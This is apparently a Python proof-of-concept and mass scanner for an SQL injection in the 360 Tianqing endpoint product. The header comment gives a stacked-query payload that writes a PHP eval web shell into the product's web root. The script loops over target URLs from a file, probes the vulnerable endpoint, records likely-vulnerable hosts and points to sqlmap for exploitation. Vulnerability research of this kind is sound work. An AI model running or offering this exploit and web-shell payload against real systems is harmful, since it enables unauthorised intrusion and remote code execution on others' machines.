
#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
POC: IP:port/api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('<?php @eval($_POST[1]);?>');copy O(T) to 'C:\Program Files (x86)\360\skylar6\www\1.php';drop table O;-- 
description: 360天擎SQL注入。
'''

import warnings
import requests

def title():
    print('*------------------------------------------*')
    print('*  \033[36mdescription: 360天擎SQL注入。                                            \033[0m')
    print('*  \033[36m使用格式:  python3 SqlInject.py                                    \033[0m')
    #print('*  \033[36mPOC: IP:port/api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('<?php @eval($_POST[1]);?>');copy O(T) to 'C:\Program Files (x86)\360\skylar6\www\1.php';drop table O;--                              \033[0m')
    print('*------------------------------------------*')

def Inject(url):
    payload = "/api/dp/rptsvcsyncpoint?ccid=1*"
    headers = { "Upgrade-Insecure-Requests": "1", 
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36", 
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
                "Accept-Encoding": "gzip, deflate", 
                "Accept-Language": "zh-CN,zh;q=0.9", 
                "Connection": "close"
        }
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, headers=headers, timeout=3, verify=False)
        if r"success" in req.text :
            print('\033[1;31m',url+"可能存在漏洞,请使用sqlmap进一步进行验证！！！",'\033[0m')
            with open('result.txt','a+') as wp:
                wp.write(url+'\n')
        else:
            pass
    except:
        pass      
if __name__ == "__main__":
    title()
    warnings.filterwarnings("ignore")
    with open('Url.txt','r') as fp:
        for url in fp.readlines():
            Inject(url.strip())
